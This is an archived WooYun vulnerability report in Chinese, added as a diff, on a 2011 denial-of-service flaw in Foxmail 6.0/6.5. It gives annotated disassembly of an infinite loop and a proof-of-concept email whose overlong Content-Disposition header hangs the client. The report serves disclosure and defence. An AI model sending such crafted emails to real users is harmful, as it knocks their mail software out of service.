@@ -1,0 +1,276 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Foxmail拒绝服务漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Foxmail拒绝服务漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/mog">mog</a> 
+</li><li>提交时间：		2011-09-05 22:44</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-09-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-09-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-09-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-09-26：	细节向普通白帽子公开<br/>
+									2011-10-06：	细节向实习白帽子公开<br/>
+									2011-10-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Foxmail 6.0,6.5存在拒绝服务漏洞,通过发送特殊的构造的邮件可使软件失去响应</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">foxmail没有对部分邮件字段进行正确的处理<br />
+<br />
+<br />
+<br />
+007DA607   8D45 F8          /LEA EAX,DWORD PTR SS:[EBP-8]<br />
+<br />
+007DA60A   8A543E FF        |MOV DL,BYTE PTR DS:[ESI+EDI-1]<br />
+<br />
+007DA60E   E8 AD9AC2FF      |CALL Foxmail.004040C0<br />
+<br />
+007DA613   8B55 F8          |MOV EDX,DWORD PTR SS:[EBP-8]<br />
+<br />
+007DA616   8B45 FC          |MOV EAX,DWORD PTR SS:[EBP-4]<br />
+<br />
+007DA619   E8 AE9BC2FF      |CALL Foxmail.004041CC<br />
+<br />
+007DA61E   8B45 FC          |MOV EAX,DWORD PTR SS:[EBP-4]<br />
+<br />
+007DA621   43               |INC EBX<br />
+<br />
+007DA622   8BC6              MOV EAX,ESI<br />
+<br />
+007DA624   E8 9B9BC2FF      |CALL Foxmail.004041C4			;取字符串长度<br />
+<br />
+007DA629   8BFB             |MOV EDI,EBX<br />
+<br />
+007DA62B   81E7 FF000000    |AND EDI,0FF				;和0xff取与<br />
+<br />
+007DA631   3BC7             |CMP EAX,EDI				;edi 和0xff取与后一定小于0xff，所有eax大于255字符长度就不会除法下面判断条件，进入死循环<br />
+<br />
+007DA633   7C 14            |JL SHORT Foxmail.007DA649<br />
+<br />
+007DA635   8A443E FF        |MOV AL,BYTE PTR DS:[ESI+EDI-1]<br />
+<br />
+007DA639   2C 0A            |SUB AL,0A<br />
+<br />
+007DA63B   74 0C            |JE SHORT Foxmail.007DA649<br />
+<br />
+007DA63D   2C 03            |SUB AL,3<br />
+<br />
+007DA63F   74 08            |JE SHORT Foxmail.007DA649<br />
+<br />
+007DA641   2C 13            |SUB AL,13<br />
+<br />
+007DA643   74 04            |JE SHORT Foxmail.007DA649<br />
+<br />
+007DA645   2C 1B            |SUB AL,1B<br />
+<br />
+007DA647  ^75 BE            JNZ SHORT Foxmail.007DA607 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">测试邮件内容<br />
+<br />
+<br />
+<br />
+From: &quot;test&quot;&lt;test@163.com&gt;<br />
+<br />
+To: &quot;test&quot;&lt;test@test.com&gt;<br />
+<br />
+Subject: test<br />
+<br />
+X-Priority: 1<br />
+<br />
+Content-Type: multipart/mixed;<br />
+<br />
+	boundary=&quot;=====001_Dragon874648247250_=====&quot;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+--=====001_Dragon874648247250_=====<br />
+<br />
+Content-Type: multipart/alternative;<br />
+<br />
+	boundary=&quot;=====003_Dragon874648247250_=====&quot;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+--=====003_Dragon874648247250_=====<br />
+<br />
+Content-Type: text/html;<br />
+<br />
+	charset=&quot;gb2312&quot;<br />
+<br />
+Content-Transfer-Encoding: 7bit<br />
+<br />
+<br />
+<br />
+test<br />
+<br />
+<br />
+<br />
+--=====003_Dragon874648247250_=====--<br />
+<br />
+--=====001_Dragon874648247250_=====<br />
+<br />
+Content-Type: application/octet-stream;<br />
+<br />
+Content-Transfer-Encoding: base64<br />
+<br />
+Content-Disposition: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;<br />
+<br />
+	filename=&quot;t.txt&quot;<br />
+<br />
+<br />
+<br />
+c3Nzc3Nzc3Nzc3M=<br />
+<br />
+<br />
+<br />
+--=====001_Dragon874648247250_=====--<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/mog" title="mog">mog</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02787" title="Foxmail拒绝服务漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：16 </p>
+													<p class="detail">确认时间：2011-09-06 15:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">thx</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="2787";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
